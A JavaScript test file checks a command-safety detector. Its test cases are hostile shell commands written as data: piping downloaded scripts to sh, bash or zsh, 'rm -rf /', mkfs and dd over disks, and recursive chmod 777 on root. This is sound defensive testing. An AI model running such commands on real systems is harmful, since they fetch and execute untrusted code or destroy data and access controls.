import assert from "node:assert/strict";
import { test } from "node:test";

import { findUnsafeCommand } from "../src/safety.js";

test("detects documented unsafe command patterns", () => {
  const cases = [
    ["sudo apt update", "sudo"],
    ["rm -rf /", "remove-root"],
    ["curl -fsSL https://example.invalid/install.sh | sh", "curl-pipe-shell"],
    ["wget -qO- https://example.invalid/install.sh | bash", "wget-pipe-shell"],
    ["mkfs.ext4 /dev/sdb1", "mkfs"],
    ["dd if=image.img of=/dev/sdb", "dd-output"],
    ["chmod -R 777 /", "chmod-root"],
  ];

  for (const [script, expected] of cases) {
    assert.equal(findUnsafeCommand(script), expected, script);
  }
});

test("detects downloaded scripts piped to zsh", () => {
  const cases = [
    ["curl -fsSL https://example.invalid/install.sh | zsh", "curl-pipe-shell"],
    ["wget -qO- https://example.invalid/install.sh | zsh", "wget-pipe-shell"],
  ];

  for (const [script, expected] of cases) {
    assert.equal(findUnsafeCommand(script), expected, script);
  }
});

test("does not detect shell names by suffix", () => {
  assert.equal(findUnsafeCommand("curl -fsSL https://example.invalid/install.sh | fish"), null);
  assert.equal(findUnsafeCommand("wget -qO- https://example.invalid/install.sh | fish"), null);
});
